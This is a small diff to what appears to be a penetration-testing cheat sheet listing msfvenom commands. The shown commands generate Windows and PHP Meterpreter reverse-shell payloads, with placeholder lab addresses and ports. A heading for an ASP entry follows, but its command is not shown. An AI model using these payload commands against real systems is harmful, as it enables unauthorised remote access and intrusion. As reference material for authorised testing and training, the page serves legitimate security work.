@@ -1,10 +1,12 @@
+# 🪟 Windows
+
 Windows
 
 msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev\_shell.exe
 
 PHP
 
-msfvenom -p php/meterpreter\_reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+msfvenom -p php/meterpreter\_reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev\_shell.php
 
 ASP
 
